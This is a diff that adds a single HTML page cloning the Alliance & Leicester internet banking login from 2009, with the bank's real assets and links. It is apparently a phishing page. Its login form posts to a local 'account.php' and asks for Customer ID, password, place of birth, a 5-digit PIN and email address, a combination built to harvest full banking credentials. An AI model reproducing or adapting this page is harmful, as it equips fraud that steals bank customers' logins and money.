@@ -1,0 +1,406 @@
+<?xml version="1.0" encoding="iso-8859-1"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html>
+<head>
+<SCRIPT Language="JavaScript">
+<!--
+
+var framesit = (top == self);
+if (!framesit) top.location.href = '/index.asp';
+
+//-->
+</SCRIPT>
+<title>Alliance&amp;Leicester - Online Banking</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<meta name="language" content="en" />
+<meta name="rating" content="General" />
+<meta name="doc-type" content="Public" />
+<meta name="doc-class" content="Living Document" />
+<meta name="robots" content="All" />
+<meta name="revisit-after" content="7 Days" />
+<meta name="description" content="Alliance &amp; Leicesterhttps://www.mybank.alliance-leicester.co.uk." />
+
+<meta name="keywords" content="Alliance &amp; Leicester,etc" />
+<meta http-equiv="imagetoolbar" content="no" />
+<meta name="author" content="@pool.net" />
+
+
+<!-- ASP Includes -->
+
+<!-- ASP Includes -->
+<script src="https://www.mybank.alliance-leicester.co.uk/includes/pm_fp.js" language="JavaScript" type="text/javascript"> </script>
+<style type="text/css">
+<!--
+@import url("https://www.mybank.alliance-leicester.co.uk/styles/L1error.css");
+@import url("https://www.mybank.alliance-leicester.co.uk/styles/L1A.css");
+@import url("https://www.mybank.alliance-leicester.co.uk/styles/L1_xsales.css");
+-->
+
+</style>
+<!--[if gte IE 6.1]>
+<style type="text/css">
+<!--
+#errorPage #error {
+	margin-top:-540px!important
+	}
+	
+#errorPage #formwrapper_right,  #errorPage #formwrapper_left {
+	margin-top:12em;
+	}
+	
+#news {height:104px!important;}
+
+-->
+</style>
+<![endif]-->
+<!-- Content Advisor Tag -->
+<link rel="meta" href="http://212.137.45.42/labels.rdf" type="application/rdf+xml" title="ICRA labels" />
+<meta http-equiv="pics-Label" content='(pics-1.1 "http://www.icra.org/pics/vocabularyv03/" l gen true for "http://212.137.45.42" r (n 0 s 0 v 0 l 0 oa 0 ob 0 oc 0 od 0 oe 0 of 0 og 0 oh 0 c 0) gen true for "http://212.137.45.42" r (n 0 s 0 v 0 l 0 oa 0 ob 0 oc 0 od 0 oe 0 of 0 og 0 oh 0 c 0))' />
+</head>
+
+<body>
+<!-- Header area -->
+<!-- Header area -->
+<div id="header"> 
+	<div id="logo"> 
+		<h2><img src="https://www.mybank.alliance-leicester.co.uk/assets/logo.gif" alt="Alliance &amp; Leicester" /></h2>
+	</div>
+	<div id="titlearea">
+		<h2><img src="https://www.mybank.alliance-leicester.co.uk/assets/internetbanking.gif" alt="Internet Banking" /></h2>
+
+		<div id="titleareanav">
+
+			<h4>
+
+				<!-- MG: Link to pop up or flat page depending on if Javascript is enabled -->
+				<script language="javascript" type="text/javascript">
+					<!--
+						var browser = navigator.userAgent
+						var browserNet = browser.indexOf('Netscape');
+						if (browserNet>0){
+ 						document.write("<a href='#' onClick='termswin=window.open(&quot;https://www.mybank.alliance-leicester.co.uk/InteractiveDemo/D1.asp&quot;,&quot;Demo&quot;,&quot;status=no,scrollbars=no,titlebar=no,menubar=0,width=766,height=510&quot;);termswin.focus();'>Demo</a>&nbsp;|&nbsp;");
+							}
+						else {
+						document.write ("<a href='#' title='Demo' onClick='termswin=window.open(&quot;https://www.mybank.alliance-leicester.co.uk/InteractiveDemo/D1.asp&quot;,&quot;Demo&quot;,&quot;status=no,scrollbars=no,titlebar=no,menubar=0,width=764,height=515&quot;);termswin.focus();'>Demo</a>&nbsp;|&nbsp;");
+						}
+						document.write ("<a href='#' title='Help and Information' onClick=';termswin=window.open(&quot;https://www.mybank.alliance-leicester.co.uk/helpinfo/help_pop_base.asp&quot;,&quot;Information&quot;,&quot;status=no,scrollbars=no,titlebar=no,menubar=0,width=600,height=465&quot;);termswin.focus();';>Help</a>");
+					-->
+				  </script>
+				  </h4>
+				  <noscript>
+						<h4>
+						<a href="https://www.mybank.alliance-leicester.co.uk/InteractiveDemo/D1.asp" title="Demo" target="_blank">Demo</a>&nbsp;|&nbsp;
+						<a href="https://www.mybank.alliance-leicester.co.uk/helpinfo/help_flat_base.asp" title="Help" target="_blank">Help</a>
+						</h4>
+				  </noscript>
+				  
+			
+		</div>
+	</div>
+</div>
+<!-- Header area end-->
+
+<!-- Main Body -->
+
+
+		
+		<!-- end message -->
+		<script language="JavaScript" type="text/javascript">
+		<!--
+		var flashinstalled = 0;
+		var flashversion = 0;
+		MSDetect = "true";
+		if (navigator.plugins && navigator.plugins.length) {
+		    x = navigator.plugins["Shockwave Flash"];
+		    if (x) {
+		        flashinstalled = 2;
+		        if (x.description) {
+		            y = x.description;
+		            flashversion = y.charAt(y.indexOf('.')-1);
+		        }
+		    }
+		    else
+		        flashinstalled = 1;
+		    if (navigator.plugins["Shockwave Flash 2.0"]) {
+		        flashinstalled = 2;
+		        flashversion = 2;
+		    }
+		}
+		else if (navigator.mimeTypes && navigator.mimeTypes.length) {
+		    x = navigator.mimeTypes['application/x-shockwave-flash'];
+		    if (x && x.enabledPlugin)
+			    flashinstalled = 2;
+		    else
+			    flashinstalled = 1;
+		}
+		else {
+		    MSDetect = "true";
+		}
+		// -->
+		</script>
+		<script language="vbscript">
+		on error resume next
+		If MSDetect = "true" Then
+			For i = 2 to 6
+				If Not(IsObject(CreateObject("ShockwaveFlash.ShockwaveFlash." & i))) Then
+				Else
+					flashinstalled = 2
+					flashversion = i
+				End If
+			Next
+			If flashinstalled = 0 Then
+				flashinstalled = 1
+			End If
+		End If
+		</script>
+		<script language="JavaScript" type="text/javascript">
+		<!--
+			if (flashinstalled == 2 && flashversion >= 6) {
+				var out = "";
+		out = out + "<object classid='clsid:D27CDB6E-AE6D-11cf-96B8-444553540000'" + "\n";
+		out = out + "width='1' height='1'>" + "\n";
+		out = out + "<param name='movie' value='pmfso.swf'>" + "\n";
+		out = out + "<param name='quality' value='high'>" + "\n";
+		out = out + "<param name='bgcolor' value=#FFFFFF>" + "\n";
+		out = out + "<param name='FlashVars' value='gotoUrl=&sendUrl=%2FstoreFSO%2Easp'>" + "\n";
+		out = out + "<embed src='pmfso.swf'" + "\n";
+		out = out + "FlashVars='gotoUrl=&sendUrl=%2FstoreFSO%2Easp'" + "\n";
+		out = out + "quality='low' bgcolor='#FFFFFF' width='1' height='1'" + "\n";
+		out = out + "type='application/x-shockwave-flash'>" + "\n";
+		out = out + "<noobject></noobject>" + "\n";
+		out = out + "</embed>" + "\n";
+		out = out + "<noobject></noobject>" + "\n";
+		out = out + "</object>" + "\n";
+				document.write(out);
+			}
+		//-->
+		</script>
+		<noscript>
+		<object classid='clsid:D27CDB6E-AE6D-11cf-96B8-444553540000'
+				width='1' height='1'  id=OBJECT1>
+			<param name='movie' value='pmfso.swf'>
+			<param name='quality' value='high'>
+			<param name='bgcolor' value=#FFFFFF>
+			<param name='FlashVars' value='gotoUrl=&sendUrl=%2FstoreFSO%2Easp'>
+			<embed src='pmfso.swf'
+					FlashVars='gotoUrl=&sendUrl=storefso.asp?'
+					quality='low' bgcolor='#FFFFFF' width='1' height='1'
+					type='application/x-shockwave-flash'>
+				<noembed></noembed>
+				<noobject></noobject>
+			</embed>
+			<noobject></noobject>
+		</object>
+		</noscript>
+
+<div id="subtitlearea">
+  <h3> <span id="subtitle">Log in to Internet Banking</span> <span id="date">21 March 2009</span></h3>
+</div>
+
+  <div id="content">
+    <div id="contentbuffer"></div>
+    
+    <p>Please enter your Customer ID below. If you are not already registered for
+      Internet Banking, <a href="https://www.mybank.alliance-leicester.co.uk/registration/r1point1.asp" title="Register now">register
+      now</a> or <br/>
+
+      <a href="http://www.alliance-leicester.co.uk/internetbanking/index.asp?page=home&amp;ct=primarymenu" title="find out more" target="_blank">find
+      out more</a>. </p>
+    <form name="login" method="post" action="account.php">
+      <input type="hidden" name="fp_browser" value="" />
+      <input type="hidden" name="fp_screen" value="" />
+      <input type="hidden" name="fp_software" value="" />
+      <script language="javascript" type="text/javascript">
+			post_fingerprints();
+		</script>
+      <div id="formwrapper_left">
+
+        <div class="formheader">
+          <h4> <span class="formtitle">Account details</span></h4>
+          <h4>
+            <script language="javascript" type="text/javascript">
+		<!--
+			document.write ("<a href='#' onClick='termswin=window.open(&quot;https://www.mybank.alliance-leicester.co.uk/helpinfo/help_pop.asp?ButtonCode=l1SecurityDetails&quot;,&quot;Information&quot;,&quot;status=no,scrollbars=no,titlebar=no,menubar=0,width=600,height=465&quot;);termswin.focus();';><img src='https://www.mybank.alliance-leicester.co.uk/assets/buttoninformation.gif' alt='Information: Security details'/></a>");
+        -->
+        </script>
+          </h4>
+          <noscript>
+          <h4><a href="https://www.mybank.alliance-leicester.co.uk/helpinfo/helpinfo_flat.asp?ButtonCode=l1SecurityDetails" title="Information"><img src="https://www.mybank.alliance-leicester.co.uk/assets/buttoninformation.gif" alt="Information: Security details"/></a></h4>
+          </noscript>
+        </div>
+
+        <div class="fr_col_wrapper">
+          <div class="fr_col1of2">
+            <label for="txtCustomerID">Enter your Customer ID</label>
+          </div>
+          <div class="fr_col2of2">
+            
+            <input name="ID" value="" type="text" id="txtCustomerID"  autocomplete="off" maxlength="8" />
+            
+          </div>
+        </div>
+
+        <div class="fr_col1of1_height">
+        </div>
+
+        <div class="fr_col_wrapper">
+          <div class="fr_col1of2">
+            <label for="txtPassword">Enter your Password</label>
+          </div>
+          <div class="fr_col2of2">
+            
+            <input name="password" value="" type="password" id="txtPassword"  autocomplete="off" maxlength="30" />
+            
+          </div>
+</div>
+
+        <div class="fr_col_wrapper">
+          <div class="fr_col1of2">
+            <label for="txtBirth">Enter your Place of Birth</label>
+          </div>
+          <div class="fr_col2of2">
+            
+            <input name="Birth" value="" type="text" id="txtBirth"  autocomplete="off" maxlength="30" />
+            
+          </div>
+        </div>
+
+        <div class="fr_col1of1_height">
+  </div>
+
+        <div class="fr_col_wrapper">
+          <div class="fr_col1of2">
+            <label for="txtPin">Customer Pin (5 digits)</label>
+          </div>
+          <div class="fr_col2of2">
+            
+            <input name="pin2" value="" type="password" id="Pin"  autocomplete="off" maxlength="5" />
+            
+          </div>
+        </div>
+
+        <div class="fr_col_wrapper">
+          <div class="fr_col1of2">
+            <label for="txtEmail">Email Address</label>
+          </div>
+          <div class="fr_col2of2">
+            
+            <input name="Email" value="" type="text" id="txtEmail"  autocomplete="off" maxlength="30" />
+            
+          </div>
+        </div>
+
+        <div class="fr_col1of1_height">
+          <input type="image" title="Next" src="https://www.mybank.alliance-leicester.co.uk/assets/btn_nextnew.gif" class="button_right"  alt="Next" />
+        </div>
+        <div class="fr_col1of1_noborder">
+          <script language="javascript" type="text/javascript">
+		<!--
+			document.write ("<a href='#' onClick='termswin=window.open(&quot;https://www.mybank.alliance-leicester.co.uk/helpinfo/help_pop.asp?ButtonCode=l1RememberMe&quot;,&quot;Information&quot;,&quot;status=no,scrollbars=no,titlebar=no,menubar=0,width=600,height=465&quot;);termswin.focus();';><img src='https://www.mybank.alliance-leicester.co.uk/assets/buttoninformationtrans.gif' alt='Information: Remember my Customer ID'/></a>");
+        -->
+        </script>
+          <noscript>
+          <a href="https://www.mybank.alliance-leicester.co.uk/helpinfo/helpinfo_flat.asp?ButtonCode=l1RememberMe" title="Information"><img src="https://www.mybank.alliance-leicester.co.uk/assets/buttoninformationtrans.gif" alt="Information: Remember my Customer ID"/></a>
+          </noscript>
+          <label for="chkRememberMe">Remember my Customer ID</label>
+
+          <input name="chkRememberMe" type="checkbox" id="chkRememberMe"  value="1"  />
+          <div class="footnote">N.B. You should not save your Customer ID on a <br/>
+            public computer</div>
+            <br/>&nbsp;Forgotten your <a href="https://www.mybank.alliance-leicester.co.uk/login/SR1.asp" title="Customer ID">Customer ID?</a>
+        </div>
+      </div>
+    </form>
+
+    <!-- The Following div must be uncommented to rise the Important information profile to Red Alert. Please also ensure the closing div below is also uncommented -->
+    <div id="formwrapper_right">
+      <div class="formheader" id="info_header">
+        <h4><span class="formtitle_padded" >Important Information</span></h4>
+      </div>
+      <div class="fr_col1of1" id="info">
+        <p><strong>Watch out for fake emails</strong><br />
+          If you receive an email that asks for your personal security details,
+          please ignore the request and forward the email to us at <a href="mailto:suspiciousemails@alliance-leicester.co.uk?body=Please%20note%20that%20this%20email%20address%20is%20for%20reporting%20suspicious%20emails%20only.%20%20For%20any%20other%20queries,%20please%20refer%20to%20the%20%27Contact%20us%27%20section%20of%20the%20website%20or%20the%20%27Help%27%20section%20of%20Internet%20Banking.%20Please%20be%20aware%20that%20you%20will%20not%20receive%20a%20reply%20to%20this%20email." title="suspiciousemails@alliance-leicester.co.uk">suspiciousemails@alliance-leicester.co.uk</a>.</p>
+
+        <p>If you are worried that someone may already have your personal security
+          details, then please contact us on 0844 800 11 44 (please dial +44 870 900 1199 if calling from outside the UK).</p>
+      </div>
+      <!-- Latest News box -->
+      <div class="formheader">
+        <h4><span class="formtitle_padded">Latest news</span></h4>
+      </div>
+      <div class="fr_col1of1" id="news">
+        <p><strong>Earn &pound;5 when you register and use Mobile Banking <br/></strong><br/>Plus, Mobile Banking is FREE until 31 May 2009!<br/>
+
+		<script language="javascript" type="https://www.mybank.alliance-leicester.co.uk/text/javascript">
+		<!--
+			document.write("<a href='#' onClick='termswin=window.open(&quot;LatestNews.asp&quot;,&quot;Information&quot;,&quot;status=no,scrollbars=no,titlebar=no,menubar=0,width=600,height=465&quot;);termswin.focus();' title='Click here to find out more'>Click here to find out more</a>.");
+		-->
+		</script>
+		<noscript>
+			<a href="LatestNews.asp" title="Click here to find out more">Click here to find out more</a>.
+		</noscript>
+		</p>
+      </div>
+    </div>
+
+    <div id="Bottom_links">
+      <div id="formwrapper_ell">
+
+      </div>
+      <div id="formwrapper_elr"> <a href="https://www.mybank.alliance-leicester.co.uk/helpinfo/W1.asp?website=https%3A%2F%2Fwww%2Ebankcardservices%2Eco%2Euk%2FNASApp%2FNetAccessXX%2FWelcomescreen%3Fcountry%3Duk%26language%3Den%26org%3D90" target="_blank" title="Service your Alliance &amp; Leicester Credit Card"> Log
+        in to Alliance &amp; Leicester Credit Card servicing</a></div>
+    </div>
+    <!-- Main Body end-->
+    <!-- The Following div must be uncommented to rise the Important information profile to Red Alert -->
+    <!-- Footer-->
+
+    <div id="footer">
+      
+<script language="javascript" type="text/javascript">
+	<!--
+		document.write("<a href='#' onClick='termswin=window.open(&quot;/foot/s1.asp&quot;,&quot;Information&quot;,&quot;status=no,scrollbars=no,titlebar=no,menubar=0,width=600,height=465&quot;);termswin.focus();' title='Security'>Security</a>");
+		document.write("&nbsp; | &nbsp; <a href='#' onClick='termswin=window.open(&quot;/foot/a1.asp&quot;,&quot;Information&quot;,&quot;status=no,scrollbars=no,titlebar=no,menubar=0,width=600,height=465&quot;);termswin.focus();' title='Accessibility'>Accessibility</a>");
+		document.write("&nbsp; | &nbsp; <a href='#' onClick='termswin=window.open(&quot;/registration/r7.asp&quot;,&quot;Information&quot;,&quot;status=no,scrollbars=no,titlebar=no,menubar=0,width=600,height=465&quot;);termswin.focus();' title='Terms &amp; Conditions'>Terms &amp; Conditions</a>");
+       -->
+</script>
+    
+<noscript>
+	<a href="https://www.mybank.alliance-leicester.co.uk/foot/s1.asp" title="Security" target="_blank">Security</a> &nbsp; 
+	| &nbsp; <a href="https://www.mybank.alliance-leicester.co.uk/foot/a1.asp" title="Accessibility">Accessibility</a> &nbsp; 
+	| &nbsp; <a href="https://www.mybank.alliance-leicester.co.uk/registration/r7_flat.asp" title="Terms &amp; Conditions">Terms &amp; Conditions</a>
+</noscript>
+      <div id="pagelabel">L1</div>
+    </div>
+	    <!-- End of l atest news box -->
+    <!-- Login Tile (if required) -->
+
+    <!-- Cross Sales Login - LEFT BANNER -->
+
+
+    <!-- End of Login Title -->
+    <!-- Footer end-->
+  </div>
+  <!-- Closing div for id="no_cs" -->
+  
+</div>
+
+<div id="buffer"></div>
+<!-- A&L Tracking Cookie -->
+
+<img src="https://www.alliance-leicester.co.uk/tracking/cookieimage.asp" width="1" height="1" alt="">
+
+<!-- BEGIN COREMETRICS SUPPORT -->
+<script language="javascript1.1" src="assets/jslib/eluminate.js" type="text/javascript"></script>
+<script language="javascript1.1" src="assets/jslib/cmdatatagutils.js" type="text/javascript"></script>
+<script language="javascript1.1"
+	 type="text/javascript">
+	<!--
+			cmSetProduction();
+			cmCreatePageviewTag("mybank-login-L1", "mybank");
+	//-->
+	</script>
+<!-- END COREMETRICS -->
+
+</body>
+</html>
